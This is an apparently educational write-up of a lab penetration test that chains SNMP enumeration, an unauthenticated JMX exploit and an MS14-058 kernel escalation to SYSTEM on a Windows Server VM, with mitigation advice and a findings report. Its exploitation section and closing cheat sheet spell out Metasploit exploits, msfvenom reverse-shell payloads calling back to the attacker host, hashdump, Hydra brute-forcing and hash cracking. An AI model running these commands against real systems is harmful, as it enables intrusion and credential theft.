# SNMP-Penetration-Testing-A-Complete-Walkthrough

This is the second write-up in the series documenting my hands-on practice with network penetration testing, service by service. This one covers SNMP, from protocol fundamentals to enumeration and exploitation techniques used to extract sensitive information and credentials from misconfigured devices.

<img width="1100" height="650" alt="image" src="https://github.com/user-attachments/assets/7f2bc29f-fb2e-4022-84bf-50d02be0fe33" />

---

## SNMP Overview

**SNMP (Simple Network Management Protocol)** is a widely used protocol for monitoring and managing networked devices, such as routers, switches, printers, firewalls, and servers. It allows network administrators to query devices for status information, configure certain settings remotely, and receive alerts (traps) when specific events occur.

SNMP is an **application layer protocol** that typically runs over **UDP** rather than TCP, which already makes it behave differently from most services covered so far, no handshake, no persistent connection, just fire-and-forget queries and replies. It's built around three core components:

- **SNMP Manager**: the system responsible for querying and interacting with SNMP agents across the network. This is typically a network monitoring station, and it's also the role an attacker effectively plays during enumeration.
- **SNMP Agent**: software running on each networked device that responds to queries from the manager and sends traps when specific events occur.
- **Management Information Base (MIB)**: a hierarchical, tree-structured database defining every piece of data exposed through SNMP. Each individual data point has a unique address called an **OID (Object Identifier)**, essentially a dotted string like `1.3.6.1.2.1.1.5` that maps to something specific, like a device's hostname.

**Versions:**

| Version | Notes |
|---|---|
| **SNMPv1** | The earliest version, using plaintext community strings (essentially passwords) for authentication. No encryption at all. |
| **SNMPv2c** | Added support for bulk data transfers and slightly better error handling, but still relies entirely on plaintext community strings, no real security improvement over v1. |
| **SNMPv3** | The first version to introduce actual security: encryption, message integrity checks, and proper user-based authentication instead of a shared community string. |

**Ports:**
- **161 (UDP)** - used for sending SNMP queries and receiving replies from the agent
- **162 (UDP)** - used for SNMP traps, unsolicited notifications sent from the agent to the manager when something noteworthy happens

The reason SNMP matters so much in a pentest comes down to one recurring problem: a huge number of devices, especially network hardware like routers, switches, and printers, ship with SNMP enabled by default, often still using the default community string `public` for read access (and sometimes `private` for read-write). When that default is left unchanged, which happens far more often than it should, SNMP turns into an information goldmine: system details, running processes, installed software, network interfaces, routing tables, and in some cases even local user accounts, all retrievable without anything resembling a traditional login.

---

## Common Vulnerabilities

### Default or Weak Community Strings

This is, by far, the most common and most damaging SNMP misconfiguration. Both SNMPv1 and SNMPv2c authenticate purely through community strings, and an overwhelming number of deployments never change the factory defaults (`public` for read-only, `private` for read-write). An attacker who guesses or brute-forces the community string gets read (or even write) access to the device's entire MIB tree, no exploit required, just a correct guess.

### Cleartext Transmission (SNMPv1/v2c)

Neither SNMPv1 nor SNMPv2c encrypt any part of their traffic, including the community string itself. This means that on a shared or poorly segmented network, an attacker with the ability to sniff traffic can simply capture the community string directly off the wire the moment any legitimate management query happens.

### Information Disclosure via Enumeration

Even with just read access, SNMP can expose far more than it should: device hostnames and descriptions, installed software and versions, running processes, network interface configurations, routing tables, and ARP tables. On some misconfigured systems, this even extends to local usernames and group memberships, information that directly feeds into later brute-force or credential-spraying attacks against other services (SSH, SMB, RDP).

### Write Access via Read-Write Community Strings

If a device has a read-write community string exposed (commonly `private`, though it can be anything), an attacker isn't limited to just reading information; they can actively modify device configuration through SNMP `SET` requests. Depending on the device, this can range from changing system descriptions to altering routing behavior or even rebooting the device.

### SNMP Brute-Force Exposure

Because community strings are just strings, and there's no account lockout mechanism built into the protocol, SNMP is highly susceptible to brute-force and dictionary attacks against the community string itself, particularly against SNMPv1/v2c, where there isn't even a username to guess alongside it.

### Lack of Authentication in SNMPv1/v2c

Beyond weak defaults, the deeper structural issue is that SNMPv1 and v2c have no real authentication mechanism at all, no username, no cryptographic proof of identity, just a shared string sent in the clear. SNMPv3 fixes this with proper user-based authentication, but adoption of v3 remains inconsistent, especially on older or embedded network hardware.

---

## Tools

**Nmap** handled reconnaissance, using NSE scripts (`snmp-sysdescr`, `snmp-interfaces`, `snmp-win32-services`, `snmp-win32-users`, `snmp-processes`, `snmp-brute`) to identify the SNMP version, confirm the community string, and enumerate system details, services, users, and running processes.

**Metasploit** carried out the exploitation and privilege escalation, using   `auxiliary/scanner/misc/java_jmx_server` to probe the JMX endpoint, `exploit/multi/misc/java_jmx_server` to gain an initial Meterpreter session through the unauthenticated JMX service, and `exploit/windows/local/ms14_058_track_popup_menu` to escalate from LOCAL SERVICE to SYSTEM.

**Hydra** was used to attempt a brute-force attack against SSH using usernames harvested from SNMP.

**hashcat** was used to crack an extracted NTLM hash and confirm the plaintext password.

**msfvenom** was used to generate a native x64 Meterpreter payload, delivered through the initial JMX foothold to bridge into a fully native session compatible with local privilege escalation modules.

---

## Reconnaissance & Enumeration

### Scope / Environment

This assessment was carried out entirely within an isolated home lab built for training and educational purposes. No production systems or third-party infrastructure were involved at any point.

- **Target:** `192.168.1.3` – Windows Server 2008 R2 Standard SP1
- **Attacker machine:** `192.168.1.5` – Kali Linux
- **Network:** Isolated VMware lab environment (private IP range, no external exposure)

### Initial Port Scan

Every SNMP assessment starts by confirming the service is actually reachable. Since SNMP runs over UDP rather than TCP, a regular scan won't catch it unless UDP scanning is explicitly requested.

```bash
nmap -sU -p161 192.168.1.3
```

<img width="2002" height="790" alt="image" src="https://github.com/user-attachments/assets/079d4d46-d2fb-4652-ba3b-6edab8234139" />


The scan confirmed port 161/udp is open, with Nmap correctly identifying the service as `snmp`. That's the green light to move forward, without this confirmation, none of the enumeration tools that follow would have anything to talk to.

### Service Fingerprinting

With the port confirmed open, the next step is finding out exactly which SNMP version is running and whether the default community string is exposed, since that determines the entire enumeration strategy going forward.

```bash
nmap -sU -sV -p161 192.168.1.3
```

<img width="2002" height="864" alt="image" src="https://github.com/user-attachments/assets/69a8d1d8-42a5-4abd-b67e-cf0329b9fe36" />


This is a significant result. Nmap didn't just confirm the service, it identified it as an **SNMPv1 server**, and even better, it directly disclosed the community string in use: **`public`**. That's the default, unauthenticated read community string, meaning this device is almost certainly wide open to full SNMP enumeration without any brute-forcing needed at all. The scan also picked up the hostname, `vagrant-2008R2`.

Two red flags already stacked on top of each other: **SNMPv1** (no encryption, no real authentication) and a **default community string** (`public`) confirmed working.

### Community String Brute-Force

Even though the community string was already disclosed in the previous scan, the correct methodology is to independently confirm it through a dedicated brute-force check rather than relying on a single scan's output alone.

```bash
nmap -sU -p161 --script=snmp-brute 192.168.1.3
```

<img width="2002" height="864" alt="image" src="https://github.com/user-attachments/assets/a42f7e7d-66d2-4636-8abf-f59ecb6cbfba" />


The result confirmed it cleanly:
```
snmp-brute:
  public - Valid credentials
```

No wordlist iteration was even needed, `public` matched on the very first attempt, which is exactly the kind of default-credential exposure this script is designed to catch. At this point, the community string is confirmed through two independent methods, leaving no doubt about the misconfiguration.

### Enumeration – System Description

With a confirmed working community string, enumeration begins with a basic system fingerprint pulled directly from SNMP.

```bash
nmap -sU -p161 --script=snmp-sysdescr 192.168.1.3
```

<img width="2002" height="1014" alt="image" src="https://github.com/user-attachments/assets/d06cebe9-c1e7-44aa-86a9-451e7fb6ffe8" />


This confirmed the exact OS build, **Windows Version 6.1, Build 7601 (Server 2008 R2)**, along with the current system uptime.

### Enumeration – Network Interfaces

Next, a look at every network interface configured on the target, including IPs, MAC addresses, and traffic stats.

```bash
nmap -sU -p161 --script=snmp-interfaces 192.168.1.3
```

<img width="1396" height="1490" alt="image" src="https://github.com/user-attachments/assets/0da3a41d-1c3c-4f92-9f67-54cbf9bab219" />


This returned a full interface inventory, 22 interfaces in total, but two are the ones that matter operationally: the **Intel(R) PRO/1000 MT Network Connection** at `192.168.1.3` and a second adapter at `192.168.18.129`, confirming this host is dual-homed across two separate subnets. The remaining entries are mostly virtual/tunnel adapters (WAN Miniports, ISATAP tunnels, QoS packet scheduler bindings) that Windows creates by default and aren't in active use here.

The key takeaway: this single unauthenticated query reveals the target's full network footprint across both subnets, without needing a single port scan or ARP sweep on the second network.

### Enumeration – Installed Windows Services

Next, a full list of Windows services installed on the target, this reveals not just OS-level services, but any third-party software running as a service.

```bash
nmap -sU -p161 --script=snmp-win32-services 192.168.1.3
```

<img width="1396" height="1378" alt="image" src="https://github.com/user-attachments/assets/fbdba467-c2af-4fbd-8fa9-e7a41c462914" />


Beyond the expected Windows OS services, this exposed a significant list of third-party applications running on the box: **Apache Tomcat 8.0**, **Elasticsearch 1.1.1**, **ManageEngine Desktop Central Server**, **OpenSSH Server**, **domain1 GlassFish Server instance** (named `domain1`), **jenkins**, **jmx**, and the **wamp** stack (`wampapache`, `wampmysqld`).

This is essentially a complete software inventory of the target, pulled with zero authentication beyond the default community string. The standalone **`jmx`** entry is worth flagging immediately, since it's the exact service that led to full remote code execution later in this assessment.

### Enumeration – Local User Accounts

This is one of the most valuable enumeration steps for what comes next: a full list of local user accounts on the target, pulled directly through SNMP.

```bash
nmap -sU -p161 --script=snmp-win32-users 192.168.1.3
```

<img width="1396" height="1192" alt="image" src="https://github.com/user-attachments/assets/867f6fac-7c7a-4deb-b1c7-3da2b07fe21a" />


The result confirmed a full list of local accounts: `Administrator`, `Guest`, `vagrant`, `sshd`, `sshd_server`, and a full cast of Star Wars-themed accounts (`luke_skywalker`, `darth_vader`, `han_solo`, `leia_organa`, `chewbacca`, and others). This is a ready-made username list for credential attacks against any other authenticated service running on the box, no exploitation or elevated access required, just the default community string.

Given that `sshd` and `sshd_server` both appear in the service list, SSH stands out as the most immediate candidate for a follow-up brute-force attempt.

### Enumeration – Running Processes

The last enumeration step pulls the full running process list, including command-line arguments and file paths, which is where the most critical finding of this entire assessment surfaces.

```bash
nmap -sU -p161 --script=snmp-processes 192.168.1.3
```

<img width="1784" height="1862" alt="image" src="https://github.com/user-attachments/assets/6a31cd90-931d-4df9-a07d-9ea716788c76" />


This confirmed the exact software stack running on the host with full install paths: `elasticsearch-1.1.1`, `glassfish4`, `tomcat8`, `jenkins.war` running on port `8484`, the `wamp` stack, and `ManageEngine DesktopCentral_Server`.

The standout finding was one specific `java.exe` process:
```
-Dcom.sun.management.jmxremote
-Dcom.sun.management.jmxremote.port=1617
-Dcom.sun.management.jmxremote.authenticate=false
```

This is a **JMX remote management interface running on port 1617 with authentication explicitly disabled**. JMX without authentication is a well-known, direct path to remote code execution, an attacker can connect to this port and load arbitrary MBeans to execute code on the host, no credentials, no exploit chain, just a connection.

**Takeaway for the full enumeration phase:** starting from nothing but a default SNMP community string, this process moved from confirming the service, to grabbing OS details, network topology, installed services, local usernames, and finally an unauthenticated JMX port ready for direct exploitation, all without a single brute-force attempt or exploit being run yet.

---

## Exploitation

### Path 1: SSH Brute-Force (Attempted)

Using the username list harvested from `snmp-win32-users`:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.3
```

<img width="2048" height="968" alt="image" src="https://github.com/user-attachments/assets/5f922d58-c967-4ed4-a42c-e4d55ca918a9" />


This attempt did not find a valid password. With the full list of harvested usernames paired against over 14 million passwords in the wordlist, the combination space ran into the hundreds of millions of attempts, and at a rate of roughly 5,200 tries per minute, completing the full run would have taken well over 1,000 hours. The attack was stopped well before covering any meaningful portion of that space, an inconclusive result rather than a confirmed dead end. A more realistic follow-up would narrow the attempt to a handful of likely usernames paired with a much smaller, curated wordlist, rather than a blind full-scale run.

Since brute-forcing didn't yield credentials, the next path pursued was the unauthenticated JMX service discovered during enumeration.

### Path 2: Searching for the Exploit

Before jumping into a specific module, a search was run to see what Metasploit offers for JMX-related exploitation.

```bash
msf6 > search jmx
```

<img width="2048" height="1080" alt="image" src="https://github.com/user-attachments/assets/9e8ae61b-8a36-4e01-9971-ce8a34ccfce6" />


The search returned several JBoss-specific modules (not relevant here) along with two that matter for this assessment:

- **`auxiliary/scanner/misc/java_jmx_server`** — a scanner module that only checks whether a target's JMX endpoint is exploitable
- **`exploit/multi/misc/java_jmx_server`** — the actual exploit module, "Java JMX Server Insecure Configuration Java Code Execution," disclosed in 2013 with an `excellent` reliability rank

### Confirming the Vulnerability with the Scanner Module

```bash
msf6 > use auxiliary/scanner/misc/java_jmx_server
msf6 > set RHOSTS 192.168.1.3
msf6 > set RPORT 1617
msf6 > run
```

<img width="1446" height="744" alt="image" src="https://github.com/user-attachments/assets/596dbd0a-2429-4e8c-944a-9f80c7a2c148" />


Since the port confirmed open during enumeration was 1617 (not the scanner's default of 1099), RPORT was set explicitly before running it. The scanner sent an RMI header to the target but returned no explicit vulnerability flag, this particular scanner module has limited reporting for this configuration. Still, with two independent sources already confirming the misconfiguration, Nmap's `java-rmi` fingerprint and SNMP's process disclosure showing `authenticate=false`, it was reasonable to proceed directly to exploitation.

### Exploitation via JMX

```bash
msf6 > use exploit/multi/misc/java_jmx_server
msf6 > set RHOSTS 192.168.1.3
msf6 > set RPORT 1617
msf6 > set payload java/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > exploit
```

<img width="2002" height="1416" alt="image" src="https://github.com/user-attachments/assets/9bfdfb14-935e-40f9-a4ed-a437ed74fb2b" />


The exploit succeeded immediately. It sent an RMI header, then automatically discovered the actual **JMXRMI endpoint** on a completely different address and port, `192.168.18.129:49187`, illustrating how JMX RMI operates in two stages: an initial registry port (1617) redirecting to a dynamically assigned endpoint. A handshake was completed with the MBean server, a payload JAR was hosted on a temporary local HTTP server and delivered via the **MLet mechanism**, and executed:

```
[*] Meterpreter session opened (192.168.1.5:4444 -> 192.168.1.3:...)
```

Full remote code execution achieved with zero credentials.

### Post-Exploitation – JMX Session

```bash
meterpreter > getuid
meterpreter > load priv
meterpreter > getsystem
```

<img width="2048" height="1154" alt="image" src="https://github.com/user-attachments/assets/c2e96c61-4993-4f6b-b797-ae66178d7a43" />

`getuid` returned **`LOCAL SERVICE`**. Attempting to load the `priv` extension failed:
```
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (java/windows)
```

This session type, running inside the JVM rather than as a native Windows process, doesn't support the extension `getsystem` depends on. Escalating from here required bridging to a native session.

### Path 3: Bridging to a Native Session

A native x64 Meterpreter payload was generated and delivered through the existing JMX foothold:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4448 -f exe -o shell2.exe
```
<img width="2002" height="670" alt="image" src="https://github.com/user-attachments/assets/6310227d-7670-44f8-9670-22631c942640" />

```
meterpreter > background
msf6 > use exploit/multi/handler
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 4448
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > exploit -j
```
<img width="1580" height="894" alt="image" src="https://github.com/user-attachments/assets/5fddb07e-e6c7-409a-babc-9af0fa321196" />


```
meterpreter > upload /home/kali/shell2.exe C:\\Windows\\Temp\\shell2.exe
meterpreter > execute -f C:\\Windows\\Temp\\shell2.exe
meterpreter > background
msf6 > sessions -l
```

<img width="1884" height="894" alt="image" src="https://github.com/user-attachments/assets/bb51fae4-e724-4c19-86cd-1b0b2b8855c9" />


This produced a genuine native session:
<img width="2048" height="1676" alt="image" src="https://github.com/user-attachments/assets/32348fe8-72de-4a72-89e6-053af8812792" />

```
Id  Type                     Information
3   meterpreter x64/windows  NT AUTHORITY\LOCAL SERVICE @ vagrant-2008R2
```

Attempting `getsystem` again on this native session still failed:
```bash
meterpreter > load priv
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1726
```

This is expected, `getsystem`'s built-in techniques (named pipe impersonation, token duplication, EfsPotato) require either local administrator rights or specific exploitable services, neither of which applied under LOCAL SERVICE. A more targeted local exploit was needed.

### Path 4: Local Privilege Escalation Enumeration

```bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set session 3
msf6 > run
```

<img width="2048" height="1118" alt="image" src="https://github.com/user-attachments/assets/a4fd7a05-532f-40bf-b49e-9d4ada9821ce" />


With a native session to work from, the suggester's 239 automated checks returned a significantly richer result than before, 11 potentially exploitable modules, including several kernel-level privilege escalation bugs specific to Windows 7 / Server 2008 R2: `cve_2019_1458_wizardopium`, `cve_2020_1054_drawiconex_lpe`, `cve_2021_40449`, `ms15_051_client_copy_image`, `ms16_075_reflection`, and notably **`ms14_058_track_popup_menu`**, a well-known, reliable win32k kernel exploit (CVE-2014-4113) for exactly this OS version.

### Path 5: Privilege Escalation – MS14-058 (Track Popup Menu)

```bash
msf6 > use exploit/windows/local/ms14_058_track_popup_menu
msf6 > set session 3
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 4449
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

<img width="2020" height="1118" alt="image" src="https://github.com/user-attachments/assets/452710c2-278b-414d-94cf-b5a01726a2ea" />


The exploit succeeded. It reflectively injected a DLL into a spawned `msiexec` process, triggering a kernel-level vulnerability in `win32k.sys` related to how the `TrackPopupMenu` API handles window messages, corrupting kernel memory in a way that allowed arbitrary code execution in kernel context:

```
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 4 opened (192.168.1.5:4449 -> 192.168.1.3:49435)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Full privilege escalation achieved.**

### Post-Exploitation – SYSTEM Access

```bash
meterpreter > sysinfo
meterpreter > hashdump
```

<img width="1784" height="1154" alt="image" src="https://github.com/user-attachments/assets/f428b860-389e-47db-8c84-96420227857c" />

`sysinfo` confirmed the target details (`VAGRANT-2008R2`, Windows Server 2008 R2 x64). `hashdump` extracted the complete local SAM database, NTLM hashes for every local account, including Administrator, now fully accessible with SYSTEM-level privileges.

### Cracking a Sample Hash

As a final step, one of the extracted NTLM hashes was cracked to show the real-world impact of weak passwords, even after SYSTEM access was already achieved.

The `vagrant` hash was saved to a file and run through hashcat using mode `1000` (NTLM) and attack mode `0` (a straight dictionary attack against `rockyou.txt`):

```bash
echo "e02bc503339d51f71d913c245d35b50b" > vagrant_hash.txt
hashcat -m 1000 -a 0 vagrant_hash.txt /usr/share/wordlists/rockyou.txt
```

<img width="1548" height="820" alt="image" src="https://github.com/user-attachments/assets/a786c0d2-e09c-45de-a30e-f774e8c5fac5" />


Interestingly, hashcat immediately flagged the hash as already cracked, pulled straight from its **potfile** (a cache of previously recovered hashes from earlier sessions on this machine, since the identical hash had already been cracked during the SMB assessment on this same host). The result was confirmed with:

```bash
hashcat -m 1000 vagrant_hash.txt --show
```

<img width="1024" height="522" alt="image" src="https://github.com/user-attachments/assets/7a7e4fb2-c50f-4e25-842e-26ecc5949a1e" />

```
e02bc503339d51f71d913c245d35b50b:vagrant
```

The password is simply **`vagrant`**, matching the username itself, arguably the weakest possible password choice. Notably, this hash was identical to the `Administrator` account's hash seen earlier in the same dump, meaning both accounts share this exact password. That's a finding on its own: password reuse across accounts, including Administrator, turns one trivially guessable password into full takeover of multiple identities on the same host.

With that, the final compromise picture is complete: SYSTEM-level access via a chained SNMP → JMX → kernel exploit path, full access to local credential material, and confirmation that both the Administrator and vagrant accounts share a trivially weak, guessable password.

### Final Result

Starting from nothing but a default SNMP community string, this engagement chained together three distinct exploitation stages: information disclosure via SNMP → unauthenticated JMX remote code execution (LOCAL SERVICE) → kernel-level privilege escalation via MS14-058 (SYSTEM). The end result is complete compromise of the target with the highest possible Windows privilege level and full access to local credential material, all without a single valid password ever being found.

---

## Mitigation / Defense

Every finding here traces back to a chain of misconfigurations, each of which independently breaks the chain if fixed.

The starting point was SNMP: disabling SNMPv1/v2c entirely, or at minimum replacing default community strings (`public`/`private`) with strong, unique values, or migrating to SNMPv3, would have prevented the entire information-gathering phase that exposed the JMX service in the first place.

The JMX exposure was the actual entry point for code execution. Any JMX remote interface should have `com.sun.management.jmxremote.authenticate` set to `true`, paired with proper SSL and a restricted access file. Running JMX with authentication disabled on a network-reachable port is equivalent to leaving a root shell open to anyone who can connect.

Even with those two fixed, the underlying OS itself was the final and most severe layer of exposure: Windows Server 2008 R2 has been out of extended support for years, and MS14-058 is a patch that has been publicly available since 2014. A consistent patch management cycle would have closed this path entirely, regardless of how the initial foothold was obtained. This point matters specifically because privilege escalation here didn't depend on any misconfiguration, it depended purely on an unpatched kernel vulnerability.

Beyond patching, the underlying host runs a stack of very old, unpatched third-party software (Elasticsearch 1.1.1, GlassFish 4, Tomcat 8, Jenkins) that independently represents further attack surface regardless of SNMP or JMX.

Finally, a full username list was harvested via SNMP with zero effort, reinforcing a recurring theme across this series: predictable account naming conventions combined with weak passwords make credential-based attacks trivial once any foothold is achieved, regardless of its origin.

---

## Report

**Executive Summary**

This assessment targeted the SNMP service on a Windows Server 2008 R2 host within the same isolated home lab used throughout this series. A default, unauthenticated SNMP community string exposed extensive system information, which revealed an unauthenticated JMX management interface. That JMX exposure was exploited for initial remote code execution, and a subsequent unpatched kernel vulnerability (MS14-058) was used to escalate privileges to full SYSTEM access.

**Scope**
- Target: `192.168.1.3` (Windows Server 2008 R2 Standard SP1)
- Attacker: `192.168.1.5` (Kali Linux)
- Services tested: SNMP (161/UDP), JMX (1617/TCP), SSH (22/TCP)
- Environment: isolated VMware lab, no external exposure

**Methodology**

The assessment followed reconnaissance and port scanning, SNMP service fingerprinting, community string confirmation, detailed enumeration via SNMP, an attempted SSH brute-force using harvested usernames, exploitation of the discovered JMX service, and a chained privilege escalation to SYSTEM.

**Findings**

**1. Default SNMP community string (`public`) with full read access** — Critical

**2. SNMPv1 in use (no encryption, no authentication)** — High

**3. Unauthenticated JMX remote interface (port 1617)** — Critical

**4. Unpatched kernel privilege escalation vulnerability (MS14-058 / CVE-2014-4113)** — Critical

**5. Full local username enumeration via SNMP** — Medium

**6. Outdated, unpatched third-party software stack (Elasticsearch, GlassFish, Tomcat, Jenkins)** — High

**Proof of Concept**

The default SNMP community string `public` was confirmed via Nmap's version scan and independently via `snmp-brute`. Enumeration revealed a JMX service running with authentication disabled on port 1617, exploited using `exploit/multi/misc/java_jmx_server`, resulting in a Meterpreter session under `LOCAL SERVICE`. A native x64 session was bridged through this foothold, and `exploit/windows/local/ms14_058_track_popup_menu` was then used to escalate to `NT AUTHORITY\SYSTEM`, from which the full local SAM database was dumped.

**Recommendations**

Disable or restrict SNMPv1/v2c, migrate to SNMPv3, enable JMX authentication, apply the MS14-058 patch (or replace the unsupported OS entirely), patch outdated third-party software, and enforce a stronger password policy given the ease of username enumeration (see Mitigation section for full details).

**Conclusion**

A single default SNMP community string, combined with an unauthenticated JMX service and an unpatched decade-old kernel vulnerability, resulted in complete compromise of the target with SYSTEM-level privileges and full credential access. This chain illustrates how independently moderate misconfigurations compound into a critical outcome, and underscores that patch management remains one of the most effective defenses available, even against vulnerabilities that have been public for over ten years.

---

## Cheat Sheet

```bash
# Recon & Enumeration
nmap -sU -p161 <target>
nmap -sU -sV -p161 <target>
nmap -sU -p161 --script=snmp-brute <target>
nmap -sU -p161 --script=snmp-sysdescr <target>
nmap -sU -p161 --script=snmp-interfaces <target>
nmap -sU -p161 --script=snmp-win32-services <target>
nmap -sU -p161 --script=snmp-win32-users <target>
nmap -sU -p161 --script=snmp-processes <target>
```

```bash
# Brute-Force (attempted)
hydra -L users.txt -P rockyou.txt ssh://<target>
```

```bash
# Exploitation — JMX
nmap -sV -p1617 <target>
msf6 > search jmx
msf6 > use auxiliary/scanner/misc/java_jmx_server
msf6 > set RHOSTS <target>
msf6 > set RPORT 1617
msf6 > run
msf6 > use exploit/multi/misc/java_jmx_server
msf6 > set RHOSTS <target>
msf6 > set RPORT 1617
msf6 > set payload java/meterpreter/reverse_tcp
msf6 > set LHOST <attacker_ip>
msf6 > exploit
```

```bash
# Bridging to Native Session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > exploit -j
meterpreter > upload shell.exe C:\\Windows\\Temp\\shell.exe
meterpreter > execute -f C:\\Windows\\Temp\\shell.exe
```

```bash
# Privilege Escalation
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set session <id>
msf6 > run
msf6 > use exploit/windows/local/ms14_058_track_popup_menu
msf6 > set session <id>
msf6 > set target 1
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <attacker_ip>
msf6 > exploit
```

```bash
# Post-Exploitation
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
```

```bash
# Cracking
echo "<ntlm_hash>" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt --show
```

---

## Related Articles

- [PowerShell for Penetration Testers - https://github.com/mohammed3id/PowerShell-for-Penetration-Testers]
- [Network Penetration Testing - https://github.com/mohammed3id/Network-Penetration-Testing]
- [SMB Penetration Testing - https://github.com/mohammed3id/SMB-Penetration-Testing-A-Complete-Walkthrough]
- [Medium - https://medium.com/@mohamed3id]
